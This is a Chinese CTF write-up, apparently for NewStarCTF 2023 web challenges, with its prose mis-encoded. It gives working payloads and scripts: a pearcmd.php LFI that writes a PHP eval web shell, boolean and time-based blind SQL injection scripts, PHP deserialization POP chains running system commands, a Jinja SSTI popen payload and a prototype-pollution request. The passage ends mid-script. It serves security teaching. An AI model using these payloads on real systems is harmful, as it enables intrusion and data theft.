åˆ†æä¸€ä¸‹ï¼Œæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°†å˜é‡å’Œ`.php`æ‹¼æ¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†å‡ ä¸ªé‡è¦çš„ä¼ªåè®®ã€‚æŒ‰ç…§å®ƒçš„æç¤ºåˆ°`./phpinfo.php`çœ‹çœ‹ï¼Œå‘ç°æœ‰å‡flagï¼Œä¸è¿‡ç»™äº†hintè®©æˆ‘ä»¬çœ‹çœ‹register_argc_argvï¼ˆä¸äº†è§£çš„å¯ä»¥ç™¾åº¦ï¼‰ã€‚æˆ‘ä»¬å†åœ¨`./phpinfo.php`æœä¸€ä¸‹ï¼Œå‘ç°é€‰é¡¹æ˜¯on
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4011d912ab244f7c933c7574fc3b2cf9.png)é‚£ä¹ˆå­˜åœ¨æ¼æ´ï¼Œå…·ä½“æ–¹æ³•ä¸ºåˆ©ç”¨pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«

é¦–å…ˆè¦çŸ¥é“åœ¨pearcmd.phpä¸­`&`ç¬¦æ— å‘åˆ†å‰²å‚æ•°ï¼ŒçœŸæ­£èƒ½åˆ†å‰²å‚æ•°çš„æ˜¯`+`ï¼›ç„¶åå°±æ˜¯åˆ©ç”¨çš„å‘½ä»¤ä¸ºconfig-createï¼Œå…¶åŒ…æ‹¬ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ç»å¯¹è·¯å¾„ï¼Œè¿˜æœ‰ä¿å­˜é…ç½®æ–‡ä»¶çš„æ–‡ä»¶åï¼›å¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™è¿›åˆ°æ–‡ä»¶é‡Œï¼Œæˆ‘ä»¬å€Ÿæ­¤å®ç°å‘½ä»¤æ‰§è¡Œ
 payload

```
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php
```

æ³¨ï¼šç”±äºæºç ä¼šæ‹¼æ¥`.php`ï¼Œæ‰€ä»¥ä¸ºpearcmd
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/835b79dffad84029bb19f9a491797961.png)

bpæŠ“åŒ…å‘é€
 ç„¶åè®¿é—®`./shell.php`
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3af5297117f544b69b8a70ef798af2e4.png)å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/045c7cd2b9c94d8db504e49267018d87.png)

### medium_sql(boolç›²æ³¨)

å¯ä»¥å…ˆbpæŠ“åŒ…ï¼Œfuzzæµ‹è¯•ä¸€ä¸‹
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/f2b5bc0ecd50444199557580dd4089bf.png)

è¿‡æ»¤çš„å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œç„¶åæç¤ºäº†ä¸èƒ½è”åˆæŸ¥è¯¢
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/909c7e74193640cdbe103c7addea8961.png)æˆ‘ä»¬å°è¯•å¸ƒå°”ç›²æ³¨

```
?id=TMP0919' And if(1>0,1,0)%23
```

æ³¨ï¼š#ä¸ºurlç¼–ç è¿‡çš„
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/dd8f9f56596a471a84972981ca99e847.png)
 ç„¶åä¿®æ”¹ä¸€ä¸‹

```
?id=TMP0919' And if(1<0,1,0)%23
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4413868dab134ba4b4b4e2dcaec81b57.png)
 å¯ä»¥å‘ç°å½“æ­£ç¡®æ—¶æœ‰å›æ˜¾ï¼Œé”™è¯¯æ—¶æ— å›æ˜¾ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨
 è„šæœ¬å¦‚ä¸‹ï¼ˆèœé¸¡æœ¬äººå†™çš„ï¼‰

```python
import requests
import string

host = "http://fad66500-0807-4ead-8cad-dbbe48fd82cc.node4.buuoj.cn:81/?id=TMP0919"

def DBname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--åº“å
            payload = "' And if(Ascii(Substr(database(),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("æ•°æ®åº“åä¸ºï¼š"+flag)

def TBname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--è¡¨å
            payload = "' And if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema='ctf'),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("æ•°æ®è¡¨åä¸ºï¼š"+flag)

def CLname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--åˆ—å
            payload = "' And if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name='here_is_flag'),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("æ•°æ®åˆ—åä¸ºï¼š"+flag)

def Valname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--æŠ¥æ•°æ®
            payload = "' And if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("æ•°æ®ä¸ºï¼š"+flag)

DBname()
TBname()
CLname()
Valname()
```

è¿è¡Œè„šæœ¬å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/20590fff244e47b2878905ecb5a2a76f.png)

### POP Gadget(å­˜åœ¨privateå’Œprotectedå±æ€§æ—¶ï¼Œæœ€å¥½ä½¿ç”¨__construct()æ–¹æ³•æ¥è¿›è¡Œæ„é€ )

æºç 

```php
 <?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']); 
```

popé“¾å­

```
Begin::__destruct -> Then::toString -> Super::__invoke -> Handle::__call -> CTF::end -> WhiteGod::__unset
```

ç”±äºé“¾å­è°ƒç”¨ä¸­æˆå‘˜å±æ€§æœ‰privateå’Œprotected
 æˆ‘ä»¬ç”¨constructæ–¹æ³•å»è°ƒç”¨é“¾å­ï¼Œæœ€åå†ä½¿ç”¨urlç¼–ç ç»•è¿‡
 exp

```php
<?php
class Begin{    
    public $name;    
    public function __construct($a)    
    {        
        $this->name = $a;    
    }
}
class Then{    
    private $func;    
    public function __construct($a)    
    {        
        $this->func= $a;    
    }
}
class Handle{    
    protected $obj;    
    public function __construct($a)    
    {        
        $this->obj = $a;    
    }
}
class Super{    
    protected $obj;    
    public function __construct($a)    
    {        
        $this->obj = $a;    
    }
}
class CTF{    
    public $handle;    
    public function __construct($a)    
    {        
        $this->handle = $a;    
    }
}
class WhiteGod{    
    public $func;    
    public $var;    
    public function __construct($a, $b)    
    {        
        $this->func = $a;        
        $this->var = $b;    
    }
}
$a = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod("readfile","/flag"))))));
echo urlencode(serialize($a));
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3c45ba7ff8f7405ab25c4fd082e8f171.png)



ä¹Ÿå¯ä»¥è¿™æ ·æ„é€ ï¼š

```php
 <?php
 
class Begin{
    public $name;
 
    public function __destruct()
    {
 
    }
}
 
class Then{
    private $func;
	
	public function __construct()
 
    {
 
        $s=new Super();
 
        $this->func=$s;
 
    }
 
    public function __toString(){
        ($this->func)();//è¿™é‡ŒæŠŠSuperå½“å‡½æ•°è°ƒç”¨ï¼Œå®é™…è§¦å‘äº†Super()é‡Œé¢çš„__invokeæ–¹æ³•
        return "Good Job!";
    }
}
 
class Handle{
    protected $obj;
	public function __construct()
 
    {
 
        $this->obj=new CTF();//å®ä¾‹åŒ–CTFï¼ˆï¼‰åç»™è¿™é‡Œçš„objèµ‹å€¼
 
    }
 
    public function __call($func, $vars)
    {
        $this->obj->end();//è°ƒç”¨äº†CTFï¼ˆï¼‰é‡Œçš„end()æ–¹æ³•
    }
 
}
 
class Super{
    protected $obj;
	public function __construct()
 
    {
 
        $this->obj=new Handle();//ä¸ºprotected $objèµ‹å€¼
    }
    public function __invoke()
    {
        $this->obj->getStr();//Handle ç±»æ²¡æœ‰å®šä¹‰ getStr() æ–¹æ³•ï¼Œå› æ­¤åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ä¼šè§¦å‘ handleé‡Œçš„__call() é­”æœ¯æ–¹æ³•
    }
 
    public function end()
    {
        die("==GAME OVER==");
    }
}
 
class CTF{
    public $handle;
 
    public function __construct()
 
    {
 
        $w=new WhiteGod();
 
        $this->handle=$w;
 
    } 
    public function end()
    {
        unset($this->handle->log);//åœ¨è¿™ä¸ªend()æ–¹æ³•ä¸­æˆ‘ä»¬è¯•å›¾ç”¨unsetï¼ˆï¼‰åˆ é™¤WhiteGod()é‡Œé¢çš„logå±æ€§
    }
 
}
 
class WhiteGod{
    public $func='system';
    public $var="cat /flag";
 
    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}
$b=new Begin();
$b->name=new Then();
echo urlencode(serialize($b)); 

```



### GenShinï¼ˆflask SSTI,fenjingç§’äº†ï¼‰

> è€ƒç‚¹ï¼šssti
>
> python3/36 -m fenjing crack --url "http://330a56fb-d27e-4700-a43f-297d1118b53d.node4.buuoj.cn:81/secr3tofpop" --method GET --inputs name

åœ¨å“åº”å¤´æ‰¾åˆ°hint
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/79111d4a6a9b4d2688b1d0dafe645dde.png)
 è®¿é—®ï¼Œfuzzæµ‹è¯•ä¸€ä¸‹
 å‘ç°è¿‡æ»¤äº†`{{}}ï¼Œ'ï¼Œrequestï¼Œinitï¼Œlipsumï¼Œpopen`
 é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨`{%print()%}`ç»•è¿‡`{{}}`ï¼Œenterä»£æ›¿initï¼Œè‡³äºpopenåˆ™å¯ä»¥å­—ç¬¦ä¸²æ‹¼æ¥ï¼ˆè™½ç„¶æ•´ä¸ªpayloadéƒ½ç›´æ¥å¯ä»¥æ‹¼æ¥ï¼‰

æˆ‘ä»¬æŸ¥æ‰¾ä¸‹èƒ½åˆ©ç”¨çš„
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/a049ce36ee954620a418a63c2dfc01e4.png)
 æŸ¥æ‰¾`<class 'os._wrap_close'>`ï¼Œåœ¨ç¬¬132ä¸ª
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4fc30c208c9e4ad5831893192d792c21.png)payload

```
{%print("".__class__.__bases__[0].__subclasses__()[132].__enter__.__globals__["pop"+"en"]("cat /flag").read())%}
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/5a7b1d34d0d74f53974cb2998fc94459.png)

### OtenkiGirl(jsåŸå‹é“¾æ±¡æŸ“)

> è€ƒç‚¹ï¼šjsåŸå‹é“¾æ±¡æŸ“

é¢˜ç›®ç»™äº†æºç ï¼Œæˆ‘ä»¬å…ˆçœ‹app.js

```js
const env = global.env = (process.env.NODE_ENV || "production").trim();
const isEnvDev = global.isEnvDev = env === "development";
const devOnly = (fn) => isEnvDev ? (typeof fn === "function" ? fn() : fn) : undefined
const CONFIG = require("./config"), DEFAULT_CONFIG = require("./config.default");
const PORT = CONFIG.server_port || DEFAULT_CONFIG.server_port;

const path = require("path");
const Koa = require("koa");
const bodyParser = require("koa-bodyparser");

const app = new Koa();

app.use(require('koa-static')(path.join(__dirname, './static')));
devOnly(_ => require("./webpack.proxies.dev").forEach(p => app.use(p)));
app.use(bodyParser({
    onerror: function (err, ctx) {
        // If the json is invalid, the body will be set to {}. That means, the request json would be seen as empty.
        if (err.status === 400 && err.name === 'SyntaxError' && ctx.request.type === 'application/json') {
            ctx.request.body = {}
        } else {
            throw err;
        }
    }
}));

[
    "info",
    "submit"
].forEach(p => { p = require("./routes/" + p); app.use(p.routes()).use(p.allowedMethods()) });

app.listen(PORT, () => {
    console.info(`Server is running at port ${PORT}...`);
})

module.exports = app;
```

ç®€å•åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯ç»™äº†ä¸¤ä¸ªè·¯ç”±ï¼Œåˆ†åˆ«æ˜¯`./info`å’Œ`./submit`
 ç„¶åæˆ‘ä»¬è·Ÿè¸ªåˆ°routeçš„info.js

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const CONFIG = require("../config")
const DEFAULT_CONFIG = require("../config.default")

async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}

router.post("/info/:ts?", async (ctx) => {
    if (ctx.header["content-type"] !== "application/x-www-form-urlencoded")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/x-www-form-urlencoded"
        }
    if (typeof ctx.params.ts === "undefined") ctx.params.ts = 0
    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;
    if (typeof timestamp !== "number")
        return ctx.body = {
            status: "error",
            msg: "Invalid parameter ts"
        }

    try {
        const data = await getInfo(timestamp).catch(e => { throw e });
        ctx.body = {
            status: "success",
            data: data
        }
    } catch (e) {
        console.error(e);
        return ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

ä»£ç å¾ˆé•¿ï¼Œä½†æ˜¯ä¸»è¦éƒ¨åˆ†å°±æ˜¯getInfoå‡½æ•°

```js
let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
```

è¿™è¡Œä»£ç åˆå§‹åŒ–ä¸€ä¸ªminTimestampå˜é‡ã€‚å®ƒä»é…ç½®å¯¹è±¡CONFIGä¸­è·å–min_public_timeå±æ€§çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä½¿ç”¨é»˜è®¤é…ç½®å¯¹è±¡DEFAULT_CONFIGä¸­çš„min_public_timeå±æ€§çš„å€¼ã€‚ç„¶åï¼Œé€šè¿‡new Date()æ„é€ å‡½æ•°å°†è¯¥æ—¶é—´è½¬æ¢ä¸ºä¸€ä¸ªæ—¥æœŸå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨getTime()æ–¹æ³•è·å–å…¶å¯¹åº”çš„æ—¶é—´æˆ³ã€‚

è€Œå½“æˆ‘ä»¬è·Ÿè¸ªåˆ°config.jsæ—¶å‘ç°å¹¶æ²¡æœ‰é…ç½®è¯¥å±æ€§ï¼Œæ‰€ä»¥å±æ€§çš„å€¼ä¸ºconfig.default.jsä¸­çš„

```
module.exports = {
    app_name: "OtenkiGirl",
    default_lang: "ja",
}
1234
module.exports = {
    app_name: "OtenkiGirl",
    default_lang: "ja",
    min_public_time: "2019-07-09",
    server_port: 9960,
    webpack_dev_port: 9970
}
```

é‚£ä¹ˆæˆ‘ä»¬çŸ¥é“getInfoå¯¹timestampè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤ï¼Œä½¿å¾—æ‰€è¿”å›çš„æ•°æ®ä¸æ—©äºé…ç½®æ–‡ä»¶configä¸­çš„min_public_timeï¼ŒçŒœæµ‹flagåœ¨è¿™ä¸ªmin_public_timeä¹‹å‰

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ä½¿å¾—è¯¥å€¼åœ¨2019-07-09ä¹‹å‰å³å¯
 æˆ‘ä»¬çŸ¥é“ä¸Šä¼ çš„ä¸ºjsonæ ¼å¼
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/c77a6b3eac4640f2b3c62ff8e6c97790.png)payload

```
{  
	"contact": "test",  
	"reason": "test",  
	"__proto__": {    
		"min_public_time": "1001-01-01"  
	}
}
1234567
```

æ±¡æŸ“æˆåŠŸ
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/70dad5d0f0ce495986472b63e624553d.png)å†æ¬¡è®¿é—®ï¼Œå¾—åˆ°flag
 ï¼ˆå¦‚æœä¸æˆåŠŸã€‚æ¸…é™¤ä¸‹ç½‘ç«™cookieå†åˆ·æ–°ï¼‰
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/3bbb294f7d464468914b08977f2ac774.png)

## WEEK4(phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸(å¢å¤š))

### é€ƒ

> è€ƒç‚¹ï¼šå­—ç¬¦ä¸²é€ƒé€¸

æºç 

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆå‘½ä»¤æ‰§è¡Œå¯¹åº”çš„å‚æ•°ä¸ºcmdï¼Œè€Œå®ä¾‹åŒ–æ—¶å¯æ§çš„å¯¹è±¡ä¸ºkeyå€¼ï¼Œé¢˜ç›®è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™æˆ‘ä»¬åªèƒ½é€šè¿‡getä¼ å‚å»æ§åˆ¶keyï¼Œç»“åˆwafå‡½æ•°å¯ä»¥å­—ç¬¦æ›¿æ¢ï¼Œè€ƒè™‘ç”¨å­—ç¬¦ä¸²é€ƒé€¸

æˆ‘ä»¬æœ¬åœ°æµ‹è¯•ä¸‹ï¼Œå¦‚æœä¼ å…¥keyå€¼ä¸ºa

```php
<?php
class GetFlag {
    public $key='a';
    public $cmd = "whoami";

}
$a=new GetFlag();
echo serialize($a);
```

é‚£ä¹ˆåºåˆ—åŒ–åçš„ç»“æœä¸º

```php
O:7:"GetFlag":2:{s:3:"key";s:1:"a";s:3:"cmd";s:6:"whoami";}
```

ç”±äºcmdçš„å€¼ä¸å¯æ§ï¼Œæˆ‘ä»¬å°è¯•æŠŠcmdçš„å€¼å†™åˆ°keyé‡Œé¢ï¼Œä¹Ÿå°±æ˜¯å°†å­—ç¬¦ä¸²`";s:3:"cmd";s:9:"cat /flag";}`å†™è¿›å»

å­—ç¬¦ä¸²å°±å˜æˆå¦‚ä¸‹

```php
O:7:"GetFlag":2:{s:3:"key";s:1:"a";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}
```

ç„¶åæˆ‘ä»¬è®¡ç®—ä¸€ä¸‹åé¢è¢«æŒ¤æ‰çš„éƒ¨åˆ†å­—ç¬¦ä¸²`a";s:3:"cmd";s:6:"whoami";}`ï¼Œé•¿åº¦ä¸º26ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦26ä¸ªbadè¢«goodæ›¿æ¢çš„å­—ç¬¦é•¿åº¦å·®1ï¼Œå†åŠ ä¸Š`whoami`å˜æˆ`cat /flag`çš„é•¿åº¦å·®3ï¼Œæ€»å…±éœ€è¦29ä¸ªbad

æ‰€ä»¥æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹

```php
O:7:"GetFlag":2:{s:3:"key";s:117:""badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}

ä¸Šä¼ ä¹‹åï¼Œè¢«å¢å¤šæ›¿æ¢ï¼šå°±æˆäº†ï¼š
O:7:"GetFlag":2:{s:3:"key";s:117:"åŒå¼•å·+29ä¸ªgood=117ä¸ªå­—ç¬¦";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}
```

ä¹Ÿå°±æ˜¯è¯´ä¸Šä¼ keyä¸º

```
"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/0071c38eaffe433f9fbe9ccc7a0bdac7.png)

### More Fast(phpååºåˆ—åŒ–ï¼ŒGCå›æ”¶æœºåˆ¶æå‰è§¦å‘__destruct())

> è€ƒç‚¹ï¼šGCå›æ”¶æœºåˆ¶æå‰è§¦å‘__destruct()

æºç 

```php
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
```

popé“¾

```php
Start.__destruct() --> Crypto.__toString() --> Reverse.__get() --> Pwn.__invoke() --> Web.evil() 
```

æ•´ä¸ªé“¾å­é€»è¾‘å¾ˆæ¸…æ™°ï¼Œå…³é”®è€ƒç‚¹å°±æ˜¯å¼€å¤´çš„è¿™ä¸€æ­¥ï¼Œç”±äºé¢˜ç›®ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´__destruct()æ–¹æ³•ä¸èƒ½è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œç»•è¿‡ï¼Œä¸‹é¢å¯¹ç»•è¿‡æ–¹æ³•è§£é‡Šä¸‹

**GCå›æ”¶æœºåˆ¶**

> åœ¨PHPä¸­ï¼Œä½¿ç”¨`å¼•ç”¨è®¡æ•°`å’Œ`å›æ”¶å‘¨æœŸ`æ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸º`NULL`ï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«`GC`æœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰é‚£ä¹ˆè¿™é‡Œçš„è¯æˆ‘ä»¬å°±å¯ä»¥ç†è§£ä¸ºï¼Œå½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œå°±ä¼šè¢«`GC`æœºåˆ¶å›æ”¶ï¼Œåœ¨å›æ”¶çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè‡ªåŠ¨è§¦å‘`_destruct`æ–¹æ³•ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»•è¿‡æŠ›å‡ºå¼‚å¸¸çš„å…³é”®ç‚¹ã€‚

ä¹Ÿå°±æ˜¯åœ¨æœ€ååºåˆ—åŒ–å‰è¿›è¡Œ`$A=array($a,NULL);`è¿™æ ·çš„æ­¥éª¤
 expå¦‚ä¸‹

```php
<?php
class Start{
    public $errMsg;
}

class Pwn{
    public $obj;
}

class Reverse{
    public $func;
}

class Web{
    public $func;
    public $var;
}

class Crypto{
    public $obj;
}

class Misc{

}

$a=new Start();
$b=new Crypto();
$c=new Reverse();
$d=new Pwn();
$e=new Web();
$a->errMsg=$b;
$b->obj=$c;
$c->func=$d;
$d->obj=$e;
$e->func='system';
$e->var="cat /f*";
$A=array($a,NULL);
echo serialize($A);
```

è¿è¡Œç»“æœ

```php
a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:1;N;}
```

**å°†æœ€åçš„`i:1`æ”¹ä¸º`i"0`å³å¯ï¼Œå¾—åˆ°flag**
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/21976b337fc54dff939ff189f2c4ff2c.png)

### midsql(æ—¶é—´ç›²æ³¨)

> è€ƒç‚¹ï¼šæ—¶é—´ç›²æ³¨

fuzzæµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°åªè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨/**/æ›¿æ¢
 ç„¶åæµ‹è¯•ï¼Œå‘ç°å¯ä»¥æ—¶é—´ç›²æ³¨

```
?id=1/**/and/**/(1,sleep(5),3)#
```

è„šæœ¬å¦‚ä¸‹

```python
import requests
import time

chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz,}{-'
database = ''
table = ''
column = ''
flag = ''

global DB_length
global TB_length
global CL_length

#çˆ†æ•°æ®åº“
for l in range(1,20):
    Url = 'http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length(database())>{0},1,sleep(3))#'
    UrlFormat = Url.format(l)      #formatï¼ˆï¼‰å‡½æ•°ä½¿ç”¨
    start_time0 = time.time()  		#å‘é€è¯·æ±‚å‰çš„æ—¶é—´èµ‹å€¼
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	#åˆ¤æ–­æ­£ç¡®çš„æ•°æ®åº“é•¿åº¦
            print('databaseé•¿åº¦ä¸ºï¼š' + str(l))
            global DB_length 
            DB_length = l	#æŠŠæ•°æ®åº“é•¿åº¦èµ‹å€¼ç»™å…¨å±€å˜é‡
            break
    else:
        pass
for i in range(1,DB_length+1):
    for char in chars:
        charAscii = ord(char) #charè½¬æ¢ä¸ºascii
        url = 'http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr(database(),{0},1))>{1},1,sleep(3))#'
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            database+=char
            print('databaseç¬¬{}ä¸ªå­—ç¬¦ï¼š{}'.format(i, database))
            break
        else:
            pass
print('databaseï¼š ' + database)

#çˆ†è¡¨
for l in range(1,20):
